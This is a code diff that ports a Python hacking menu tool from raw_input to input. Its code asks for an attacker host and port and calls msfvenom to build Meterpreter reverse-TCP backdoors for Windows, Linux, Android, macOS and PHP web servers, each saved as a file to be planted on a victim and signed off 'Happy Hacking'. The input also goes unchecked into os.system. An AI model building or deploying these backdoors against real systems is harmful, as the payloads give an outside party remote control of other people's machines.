@@ -35,7 +35,7 @@ _____________________________________________________________
 
 """)
 
-choice = raw_input("Enter your choice #~:  ")
+choice = input("Enter your choice #~:  ")
 
 if(choice=="1"):
 	print("""
@@ -69,21 +69,21 @@ if(choice=="1"):
 
 
        """)
-	bd = raw_input("Which Backdoor You want to generate? #~: ")
+	bd = input("Which Backdoor You want to generate? #~: ")
 
 	if(bd=="1"):
 		os.system("clear")
 		os.system("figlet WINDOWS BACKDOOR")
-		lhost = raw_input("LHOST: ")
-		lport = raw_input("LPORT: ")
+		lhost = input("LHOST: ")
+		lport = input("LPORT: ")
 		os.system("msfvenom -p windows/meterpreter/reverse_tcp lhost=" + lhost + " lport="  + lport + " -f exe > /root/Desktop/backdoor.exe")
 		print("(*) Backdoor generated. Happy Hacking :D")
 
 	if(bd=="2"):
 		os.system("clear")
 		os.system("figlet LINUX BACKDOOR")
-		lhost = raw_input("LHOST: ")
-		lport = raw_input("LPORT: ")
+		lhost = input("LHOST: ")
+		lport = input("LPORT: ")
 		os.system("msfvenom -p python/meterpreter/reverse_tcp lhost=" + lhost + " lport=" + lport + " > /root/Desktop/backdoor.py")
 		print("(*) Backdoor generated. Happy Hacking :D")
 
@@ -91,8 +91,8 @@ if(choice=="1"):
 	if(bd=="3"):
 		os.system("clear")
 		os.system("figlet ANDROID BACKDOOR")
-		lhost = raw_input("LHOST: ")
-		lport = raw_input("LPORT: ")
+		lhost = input("LHOST: ")
+		lport = input("LPORT: ")
 		os.system("msfvenom -p  android/meterpreter/reverse_tcp lhost=" + lhost + " lport=" + lport + " > /root/Desktop/backdoor.apk")
 		print("(*) Backdoor generated. Happy Hacking :D")
 
@@ -100,8 +100,8 @@ if(choice=="1"):
 	if(bd=="4"):
 		os.system("clear")
 		os.system("figlet MacOS BACKDOOR")
-		lhost = raw_input("LHOST: ")
-		lport = raw_input("LPORT: ")
+		lhost = input("LHOST: ")
+		lport = input("LPORT: ")
 		os.system("msfvenom -p  java/meterpreter/reverse_tcp lhost=" + lhost + " lport=" + lport + " -f jar > /root/Desktop/backdoor.jar")
 		print("(*) Backdoor generated. Happy Hacking :D")
 
@@ -109,8 +109,8 @@ if(choice=="1"):
 	if(bd=="5"):
 		os.system("clear")
 		os.system("figlet WEB BACKDOOR")
-		lhost = raw_input("LHOST: ")
-		lport = raw_input("LPORT: ")
+		lhost = input("LHOST: ")
+		lport = input("LPORT: ")
 		os.system("msfvenom -p  php/meterpreter/reverse_tcp lhost= " + lhost + " lport= " + lport + " > /root/Desktop/backdoor.php")
 		print("(*) Backdoor generated. Happy Hacking :D")
 
